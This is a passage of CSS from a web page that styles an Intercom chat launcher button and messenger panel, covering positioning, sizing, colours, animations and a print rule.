      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>